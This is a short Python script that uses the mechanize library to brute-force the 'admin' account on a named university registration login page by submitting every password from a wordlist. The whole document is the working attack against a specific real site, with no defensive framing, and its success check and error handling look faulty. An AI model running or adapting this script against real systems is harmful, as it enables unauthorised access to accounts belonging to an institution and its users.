"""
Created on Wed Aug 19 11:11:34 2020

@author:
"""

import mechanize
b = mechanize.Browser()

url = "https://elf.ku.edu.np/reg/index.php"
#wordlist = wordlist.txt

try:
    wordlist = open("worldlist.txt", "r")
except:
    print("\n worldlist not found")
for password in wordlist:

    response = b.open(url)
    b.select_form("loginCForm")
    b.form['uName'] = 'admin'
    b.form['pass'] = password.strip()

    b.method = "POST"
    response = b.submit()

    if(response.geturl () == "https://elf.ku.edu.np/reg/index.php"):
        print("pASSWORD fOUND! :" + password.strip())
        break
